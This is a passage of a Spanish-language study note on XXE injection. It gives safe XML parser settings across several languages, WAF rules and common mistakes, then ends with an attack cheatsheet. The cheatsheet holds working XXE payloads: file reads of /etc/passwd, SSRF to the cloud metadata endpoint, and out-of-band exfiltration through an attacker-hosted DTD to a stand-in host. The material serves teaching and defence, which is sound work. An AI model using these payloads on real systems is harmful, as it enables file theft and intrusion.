dbf.setFeature("http://apache.org/xml/features/nonvalidating/load-external-dtd", false);
dbf.setXIncludeAware(false);
dbf.setExpandEntityReferences(false);
```

```python
# Python — defusedxml (recomendado)
from defusedxml import ElementTree as SafeET   # ✅ doctypes/entidades/XInclude desactivados
# ❌ xml.etree.ElementTree / minidom / pulldown: histórico con XXE activo
```

```csharp
// .NET moderno
var doc = new XmlDocument { XmlResolver = null }; // ✅ sin resolución externa
// o XDocument.Parse(xml) / XmlReader con DtdProcessing = DtdProcessing.Prohibit
```

```go
// Go: encoding/xml no resuelve entidades externas por defecto — mantenerlo así
// ❌ no usar librerías que añadan un EntityReader custom con entidades externas
```

> [!warning] `libxml_disable_entity_loader` es una trampa
> Desde PHP 8.0 la función está obsoleta porque libxml ≥ 2.9 ya no resuelve entidades externas por defecto. Llamarla **no protege** contra XInclude ni contra DTDs internos con expansión; la defensa correcta es **no** pasar `LIBXML_NOENT`, usar `LIBXML_NONET` y validar/esquemas sin DOCTYPE. En PHP legacy la llamada ayudaba, pero dependía de que nadie reactivara la resolución con flags.

```php
// PHP correcto (libxml moderno)
$doc = simplexml_load_string($xml, "SimpleXMLElement", LIBXML_NONET); // ✅ sin red
//❌ simplexml_load_string($xml, ..., LIBXML_NOENT);                  // reactiva entidades
```

### 2. Sanitizar/servir XML sin DOCTYPE y con schema

- Regla WAF/app: rechazar bodies XML que contengan `<!DOCTYPE`, `<!ENTITY`, `SYSTEM` o `XInclude`.
- Validar contra XSD en modo "no network"; tratar SVG/XML subido como binario peligroso (ver [[Abuso de Subida de Archivos]]): servir con `Content-Disposition`, sin ejecución y en dominio separado.

### 3. Salida de red restringida (mitiga OOB/SSRF)

Allowlist de destinos salientes del servicio XML, o sinkhole de `file://` y del endpoint de metadata cloud: defensa en profundidad si algo se cuela.

## Errores comunes

**Atacante:**
1. Probar solo `file:///etc/passwd` en un backend Windows (`file:///C:/Windows/win.ini`).
2. Dejar `%exfil;` sin escapar (`&#x25;`) — el parser falla al expandir la declaración.
3. Esperar la respuesta del OOB: el blind XXE no devuelve nada; revisá el Collaborator, no la respuesta.
4. Olvidar los `&` de la referencia (`&xxe;` vs `xxe;`) o declarar `%request;` antes de `%eval;`.
5. Subir el SVG pero no verificar que el servidor lo parsea al mostrarlo.

**Defensor:**
1. "Actualizamos libxml/PHP": correcto pero insuficiente — XInclude, SOAP y parsers de terceros siguen expuestos.
2. Pasar `LIBXML_NOENT` "para que expanda" y reactivar XXE.
3. Bloquear solo `file://` y dejar `http://` (SSRF intacto).
4. Dejar el parser legacy de .NET (`DtdProcessing=Parse`) por compatibilidad.

## Cheatsheet

```xml
<!-- In-band: lectura de archivos -->
<!DOCTYPE f [ <!ENTITY xxe SYSTEM "file:///etc/passwd"> ]><r><a>&xxe;</a></r>
<!-- PHP en base64 -->
<!DOCTYPE f [ <!ENTITY xxe SYSTEM "php://filter/convert.base64-encode/resource=/etc/passwd"> ]>
<!-- SSRF -->
<!DOCTYPE f [ <!ENTITY xxe SYSTEM "http://169.254.169.254/latest/meta-data/"> ]>
<!-- OOB: DTD externo (evil.dtd alojado por el atacante) -->
<!ENTITY % file SYSTEM "file:///etc/passwd">
<!ENTITY % eval "<!ENTITY &#x25; exfil SYSTEM 'http://A/?f=%file;' >">%eval;%exfil;
<!-- Petición que carga el DTD externo -->
<!DOCTYPE f [ <!ENTITY % dtd SYSTEM "http://A/evil.dtd"> %dtd; ]>
<!-- Error-based -->
<!ENTITY % eval "<!ENTITY &#x25; r SYSTEM 'file:///no/%file;' >">
<!-- XInclude (DOCTYPE bloqueado) -->
<f xmlns:xi="http://www.w3.org/2001/XInclude"><xi:include parse="text" href="file:///etc/passwd"/></f>
<!-- Confirmación: entidad interna reflejada -->
<!DOCTYPE f [ <!ENTITY myName "stark"> ]><r><a>&myName;</a></r>
```

## Laboratorios y referencias

- PortSwigger Academy — XXE: https://portswigger.net/web-security/xxe
- OWASP — XML External Entity Prevention Cheat Sheet: https://cheatsheetseries.owasp.org/cheatsheets/XML_External_Entity_Prevention_Cheat_Sheet.html
- PayloadsAllTheThings — XXE Injection: https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/XXE%20Injection
- XXELab (docker de la clase): https://github.com/jbarone/xxelab
- defusedxml (Python): https://pypi.org/project/defusedxml/

## Relacionadas

- [[Server-Side Request Forgery (SSRF)]] — el SSRF vía `SYSTEM`/entidades externas
- [[Local File Inclusion]] — el mismo impacto de lectura de archivos por otro camino
- [[Ataques de Deserialización]] — parsers "fantasma" que procesan XML dentro de cadenas de ataque
- [[Abuso de Subida de Archivos]] — XXE por SVG y políglotos subidos
- [[Abuso de APIs]] — endpoints JSON que aceptan XML cambiando el `Content-Type`
